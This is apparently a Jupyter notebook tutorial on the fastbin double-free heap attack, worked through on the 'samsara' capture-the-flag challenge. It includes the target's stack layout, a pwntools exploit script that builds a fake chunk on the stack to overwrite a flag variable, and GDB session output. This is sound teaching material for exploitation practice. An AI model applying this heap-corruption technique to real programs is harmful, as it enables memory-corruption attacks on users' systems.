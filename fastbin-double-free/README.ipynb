{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Fastbin Double Free Attack\n",
    "\n",
    "Only work before glibc 2.28 (inclusive). In 2.29, the tcache checks whether there are duplicated chunks. The tcache is introduced in 2.26."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "tags": []
   },
   "source": [
    "## Example: samsara\n",
    "\n",
    "Source: MetasequoiaCTF 202002020-0221\n",
    "\n",
    "This program provides four actions:\n",
    "\n",
    "- `data[count++] = malloc(8)`, where `count` is a counter which increases by one on each call to `malloc`.\n",
    "- `free(data[i])`, where `i` is read from the stdin.\n",
    "- `data[i] = x`, where `i` and `x` are read from the stdin.\n",
    "- Get the address of a variable `ref` on the stack and set the value of `ref`.\n",
    "\n",
    "Our goal is to set the value of a variable `flag` on the stack to `0xdeadbeef`.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/ctf/work/fastbin-double-free/samsara'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Full RELRO\n",
      "    Stack:    Canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n"
     ]
    }
   ],
   "source": [
    "bin_filename = './samsara'\n",
    "from pwn import *\n",
    "from pwnlib import gdb\n",
    "\n",
    "context.terminal = ['tmux', 'new-window']\n",
    "elf = ELF(bin_filename)\n",
    "# print(elf.checksec())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The key idea is to construct a fake chunk whose data is `flag`. To do this, let's examine the stack layout:\n",
    "\n",
    "```c\n",
    "int current_cnt; // ebx\n",
    "int action; // [rsp+Ch] [rbp-44h] BYREF\n",
    "int index; // [rsp+10h] [rbp-40h] BYREF      <---- prev  (fake chunk begin here)\n",
    "__gid_t rgid; // [rsp+14h] [rbp-3Ch]         <---- prev+4\n",
    "__int64 ref; // [rsp+18h] [rbp-38h] BYREF    <---- size  (fake chunk size should be 0x20)\n",
    "__int64 flag; // [rsp+20h] [rbp-30h]         <---- mem / fd\n",
    "__int64 v10; // [rsp+28h] [rbp-28h] BYREF    <---- bk\n",
    "__int64 tmp[4]; // [rsp+30h] [rbp-20h] BYREF\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "def wait_for_prompt(io: tube):\n",
    "    io.recvuntil(b'> ')\n",
    "\n",
    "def call_malloc(io: tube):\n",
    "    wait_for_prompt(io)\n",
    "    io.sendline(b'1')\n",
    "\n",
    "def call_free(io: tube, i):\n",
    "    wait_for_prompt(io)\n",
    "    io.sendline(f'2 {i}'.encode())\n",
    "\n",
    "def call_set_value(io: tube, i, x):\n",
    "    wait_for_prompt(io)\n",
    "    io.sendline(f'3 {i} {x}'.encode())\n",
    "    \n",
    "def call_set_ref(io: tube, x):\n",
    "    wait_for_prompt(io)\n",
    "    io.sendline(f'5 {x}'.encode())\n",
    "    \n",
    "def call_get_ref(io: tube) -> int:\n",
    "    wait_for_prompt(io)\n",
    "    io.sendline(b'4')\n",
    "    io.recvuntil(b'Your lair is at: ')\n",
    "    v = io.recvline()\n",
    "    v = int(v.decode(), 16)\n",
    "    return v\n",
    "\n",
    "def call_print_flag(io: tube):\n",
    "    wait_for_prompt(io)\n",
    "    io.sendline(b'6')\n",
    "\n",
    "def exploit(io, fake_chunk_offset):\n",
    "    call_malloc(io)  # data[0] -> chunk 0\n",
    "    call_malloc(io)  # data[1] -> chunk 0\n",
    "    call_free(io, 0) # chunk 0\n",
    "    call_free(io, 1) # chunk 0 -> chunk 1\n",
    "    call_free(io, 0) # chunk 0 -> chunk 1 -> chunk 0\n",
    "    call_malloc(io)  # data[2] -> chunk 0\n",
    "    call_malloc(io)  # data[3] -> chunk 1\n",
    "    ref_addr = call_get_ref(io)\n",
    "    print(f\"{hex(ref_addr)=}\")\n",
    "    fake_chunk_addr = ref_addr + fake_chunk_offset\n",
    "    call_set_ref(io, 0x20) # fake chunk size\n",
    "    call_set_value(io, 2, fake_chunk_addr)  # chunk 0 -> fake chunk\n",
    "    call_malloc(io)  # data[4] -> chunk 0\n",
    "    call_malloc(io)  # data[5] -> fake chunk\n",
    "    call_set_value(io, 5, 0xdeadbeef)\n",
    "    call_print_flag(io)\n",
    " "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Run the GDB as in the below code, we can see how the block list changes. With glibc 2.24, the output is:\n",
    "\n",
    "```\n",
    "0x55555561b030 --> 0x55555561b010 --> 0x0\n",
    "0x55555561b010 --> 0x55555561b030 --> 0x55555561b010 (overlap chunk with 0x55555561b010(freed) ) \n",
    "0x55555561b010 --> 0x7fffffffed10 --> 0x0 \n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2.19  2.23  2.24  2.27\t2.28  2.29  2.30\n",
      "[!] Debugging process with ASLR disabled\n",
      "[x] Starting local process '/usr/bin/gdbserver'\n",
      "[+] Starting local process '/usr/bin/gdbserver': pid 1271\n",
      "[*] running in new terminal: /usr/bin/gdb -q  \"./samsara\" -x /tmp/pwn5vztgbhh.gdb\n",
      "hex(ref_addr)='0x7fffffffed18'\n",
      "[*] Process '/usr/bin/gdbserver' stopped with exit code 0 (pid 1275)\n"
     ]
    }
   ],
   "source": [
    "!ls /glibc\n",
    "glibc = \"2.27\"\n",
    "context.aslr = False\n",
    "!patchelf --set-interpreter '/glibc/{glibc}/64/lib/ld-{glibc}.so' {bin_filename}\n",
    "io = gdb.debug([bin_filename],\n",
    "               env={\"LD_PRELOAD\": \"/glibc/{glibc}/64/lib/libc.so\"},\n",
    "               gdbscript=\"\"\"\n",
    "# break before taking an action\n",
    "b *0x555555400b40\n",
    "commands\n",
    "  silent\n",
    "  parseheap\n",
    "  heapinfo\n",
    "end\n",
    "\n",
    "b *0x555555400d38\n",
    "commands\n",
    "  printf \"You get the flag\"\n",
    "end\n",
    "c\n",
    "\n",
    "# before double free\n",
    "c 4\n",
    "# double free!\n",
    "c 1\n",
    "# construct the fake chunk\n",
    "c 5\n",
    "# set deadbeef\n",
    "c 3\n",
    "# show the content of the fake chunk\n",
    "x/4g 0x7fffffffed10\n",
    "\n",
    "c\n",
    "quit\n",
    "set context-output /dev/null\n",
    "\"\"\")\n",
    "try:\n",
    "    if glibc <= \"2.25\":\n",
    "        offset = -0x8\n",
    "    else:\n",
    "        # in tcache, the fd pointer points to chunk+0x10\n",
    "        offset = 0x8\n",
    "    exploit(io, offset)\n",
    "    io.poll(block=True)\n",
    "except Exception as e:\n",
    "    io.kill()\n",
    "    raise e"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
